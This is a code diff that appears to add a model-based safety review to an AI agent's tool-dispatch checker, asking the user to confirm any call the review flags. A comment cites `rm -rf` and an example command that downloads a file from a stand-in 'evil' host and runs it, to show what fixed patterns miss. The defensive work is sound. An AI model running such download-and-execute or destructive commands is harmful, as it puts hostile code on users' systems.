@@ -52,4 +52,22 @@ def check(tool_name: str, inputs: dict) -> tuple[bool, str]:
             else:
                 proceed = _confirm_fn(reason)
                 return proceed, reason
+
+    # Second layer: the pattern list above is finite and cannot enumerate hostile
+    # intent (it stops `rm -rf` and misses `curl evil | -o /tmp/x && /tmp/x`).
+    # Ask a model. This runs ONLY because nothing above matched, so the reviewer
+    # can add caution but can never overturn a block — see agent/command_review.
+    try:
+        from agent import command_review
+        risky, why = command_review.review(tool_name, inputs)
+    except Exception:
+        risky, why = False, ""   # review must never break tool dispatch
+    if risky:
+        reason = f"Flagged by safety review: {why}\nTool: {tool_name}"
+        if _confirm_fn is None:
+            print(f"\n[Safety] {reason}")
+            answer = input("Proceed? (y/N): ").strip().lower()
+            return answer in {"y", "yes"}, reason
+        return _confirm_fn(reason), reason
+
     return True, ""
